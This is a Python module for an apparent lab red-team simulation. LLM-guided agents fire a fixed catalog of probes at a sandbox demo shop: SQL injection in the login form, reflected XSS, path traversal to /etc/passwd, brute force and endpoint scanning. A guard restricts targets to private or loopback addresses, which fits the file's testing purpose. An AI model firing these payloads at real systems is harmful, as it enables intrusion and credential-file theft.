"""The three Red Team agents: Recon, Analyst, Planner.

Like the Blue Team, they only talk to each other (and to the Judge) through
the hub, so every message is signed, encrypted, checked against the role
policy, and written to the audit log.

Safety rules, enforced in code (not just by convention):
  * every probe is aimed at the lab proxy, and `ensure_target_allowed` refuses
    to run against anything outside loopback / RFC1918 private addresses;
  * the only payloads ever sent are the fixed CATALOG below - the same
    sqli / xss / traversal / brute-force / recon strings the Blue Team's own
    detector and test suite already use. Nothing here is ever built from
    live text, and no LLM is ever asked to invent a new payload or a new
    target; a model may only pick one row from CATALOG and must give its
    'kind' back, checked against CATALOG before it is trusted.
"""
import ipaddress
import random
import socket
import threading
import time
from urllib.parse import urlparse

import requests

CATALOG = [
    {"id": "sqli_login", "kind": "sqli", "method": "POST", "path": "/rest/user/login",
     "json": {"email": "' or 1=1--", "password": "x"}, "label": "SQL injection in the login form"},
    {"id": "xss_search", "kind": "xss", "method": "GET", "path": "/rest/products/search",
     "params": {"q": "<script>alert(1)</script>"}, "label": "reflected XSS in the product search"},
    {"id": "traversal_ftp", "kind": "traversal", "method": "GET", "path": "/ftp/../../etc/passwd",
     "label": "path traversal under /ftp"},
    {"id": "brute_login", "kind": "brute_force", "method": "POST", "path": "/rest/user/login",
     "repeat": 6, "label": "credential brute force against the login endpoint"},
    {"id": "recon_scan", "kind": "recon_scan", "method": "GET", "path": None,
     "repeat": 16, "label": "scan for hidden/missing endpoints"},
]
CATALOG_BY_ID = {c["id"]: c for c in CATALOG}
KINDS = tuple(sorted({c["kind"] for c in CATALOG}))

PLANNER_SYSTEM = (
    "You are planning the order of a lab penetration test against a sandbox demo shop you own. "
    "Pick exactly one id from this fixed catalog: " + ", ".join(c["id"] for c in CATALOG) + ". "
    'Reply with ONLY JSON: {"next":"<one catalog id>","reason":"max 12 words"}. '
    "Never propose anything outside this catalog."
)


class TargetNotAllowed(Exception):
    pass


def ensure_target_allowed(base_url: str) -> None:
    """Refuse to attack anything that is not on a private/loopback lab address."""
    host = urlparse(base_url).hostname
    if not host:
        raise TargetNotAllowed(f"no host in {base_url!r}")
    try:
        addr = ipaddress.ip_address(host)
    except ValueError:
        try:
            addr = ipaddress.ip_address(socket.gethostbyname(host))
        except (socket.gaierror, ValueError):
            raise TargetNotAllowed(f"cannot resolve {host!r}; refusing to guess")
    if not (addr.is_loopback or addr.is_private or addr.is_link_local):
        raise TargetNotAllowed(f"{host} ({addr}) is not a private lab address")


def _random_path() -> str:
    return "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))


def fire(proxy: str, probe: dict, timeout: float = 10.0) -> list:
    """Actually send the probe to the lab proxy. Returns a list of {status, path}."""
    ensure_target_allowed(proxy)
    results = []
    reps = probe.get("repeat", 1)
    for i in range(reps):
        path = probe["path"]
        if probe["id"] == "brute_login":
            body = {"email": "zt-probe@test.local", "password": f"wrong-{i}"}
            r = requests.post(proxy + path, json=body, timeout=timeout)
        elif probe["id"] == "recon_scan":
            path = _random_path()
            r = requests.get(proxy + path, timeout=timeout)
        elif probe["method"] == "GET":
            r = requests.get(proxy + probe["path"], params=probe.get("params"), timeout=timeout)
        else:
            r = requests.post(proxy + probe["path"], json=probe.get("json"), timeout=timeout)
        results.append({"status": r.status_code, "path": path})
    return results


def say(agent: str, msg: str) -> None:
    print(f"[{agent}] {msg}", flush=True)


class BaseRedAgent:
    name = "red"

    def __init__(self, client, interval: float = 2.0):
        self.client = client
        self.interval = interval

    def say(self, msg: str) -> None:
        say(self.name, msg)

    def run(self, stop: threading.Event) -> None:
        while not stop.is_set():
            try:
                self.step()
            except requests.RequestException as e:
                self.say(f"network error: {e}")
            except TargetNotAllowed as e:
                self.say(f"REFUSING - {e}")
                stop.set()
                break
            except Exception as e:  # noqa: BLE001 - keep one bad round from killing the agent
                self.say(f"error: {e}")
            stop.wait(self.interval)

    def step(self) -> None:
        raise NotImplementedError


class ReconAgent(BaseRedAgent):
    """Probes the lab proxy once and reports what it found to the Analyst."""
    name = "red-recon"

    def __init__(self, client, proxy: str, analyst_id: str):
        super().__init__(client, interval=3600)  # one recon pass is enough for a demo run
        self.proxy = proxy
        self.analyst_id = analyst_id
        self._done = False

    def step(self) -> None:
        if self._done:
            return
        ensure_target_allowed(self.proxy)
        known = ["/", "/rest/user/login", "/rest/products/search", "/rest/admin/application-version",
                 "/api/Challenges/", "/rest/basket/1"]
        found = []
        for path in known:
            try:
                r = requests.get(self.proxy + path, timeout=10)
                found.append({"path": path, "status": r.status_code})
            except requests.RequestException:
                found.append({"path": path, "status": None})
        report = {"target": self.proxy, "endpoints": found, "ts": time.time()}
        status, resp = self.client.send(self.analyst_id, "recon_report", report)
        self.say(f"sent recon_report ({len(found)} endpoints) -> {status}")
        self._done = True


class AnalystAgent(BaseRedAgent):
    """Reads recon_report and turns it into a prioritized list of findings."""
    name = "red-analyst"

    def __init__(self, client, planner_id: str, recon_id: str):
        super().__init__(client, interval=2.0)
        self.planner_id = planner_id
        self.recon_id = recon_id
        self._sent = False

    def step(self) -> None:
        if self._sent:
            return
        for msg in self.client.poll():
            if not msg.get("ok") or msg["sender"] != self.recon_id or msg["type"] != "recon_report":
                continue
            endpoints = msg["body"].get("endpoints", [])
            findings = []
            for e in endpoints:
                path = str(e.get("path", ""))
                if "login" in path:
                    findings.append({"path": path, "interesting_for": ["sqli_login", "brute_login"]})
                elif "search" in path:
                    findings.append({"path": path, "interesting_for": ["xss_search"]})
                elif e.get("status") == 404:
                    findings.append({"path": path, "interesting_for": ["recon_scan"]})
            findings.append({"path": "/ftp/..", "interesting_for": ["traversal_ftp"]})
            status, resp = self.client.send(self.planner_id, "findings",
                                             {"findings": findings, "ts": time.time()})
            self.say(f"sent findings ({len(findings)} leads) -> {status}")
            self._sent = True


class PlannerAgent(BaseRedAgent):
    """Turns findings into an ordered sequence of catalog probes and fires them."""
    name = "red-planner"

    def __init__(self, client, proxy: str, analyst_id: str, report_to: str = None,
                 ask=None, rounds: int = None):
        super().__init__(client, interval=2.0)
        self.proxy = proxy
        self.analyst_id = analyst_id
        self.report_to = report_to
        self.ask = ask
        self.rounds = rounds if rounds is not None else len(CATALOG)
        self._queue = []
        self._fired = 0
        self._got_findings = False

    def step(self) -> None:
        if not self._got_findings:
            for msg in self.client.poll():
                if msg.get("ok") and msg["sender"] == self.analyst_id and msg["type"] == "findings":
                    leads = msg["body"].get("findings", [])
                    ordered = [i for f in leads for i in f.get("interesting_for", [])]
                    seen = set()
                    self._queue = [CATALOG_BY_ID[i] for i in ordered
                                   if i in CATALOG_BY_ID and not (i in seen or seen.add(i))]
                    for c in CATALOG:
                        if c["id"] not in seen:
                            self._queue.append(c)
                    self._got_findings = True
            if not self._got_findings:
                return

        if self._fired >= self.rounds or not self._queue:
            return
        probe = self._pick_next()
        ensure_target_allowed(self.proxy)
        try:
            results = fire(self.proxy, probe)
        except TargetNotAllowed:
            raise
        event = {"id": probe["id"], "kind": probe["kind"], "label": probe["label"],
                 "results": results, "ts": time.time()}
        if self.report_to:
            status, resp = self.client.send(self.report_to, "attack_event", event)
            self.say(f"fired {probe['id']} ({len(results)} req) -> judge:{status}")
        else:
            self.say(f"fired {probe['id']} ({len(results)} req), no --report-to set")
        self._fired += 1

    def _pick_next(self) -> dict:
        if self.ask and self._queue:
            try:
                res = self.ask(PLANNER_SYSTEM, "Candidates: " + ", ".join(c["id"] for c in self._queue))
            except Exception:
                res = None
            if isinstance(res, dict) and res.get("next") in CATALOG_BY_ID:
                chosen = CATALOG_BY_ID[res["next"]]
                if chosen in self._queue:
                    self._queue.remove(chosen)
                    return chosen
        return self._queue.pop(0)
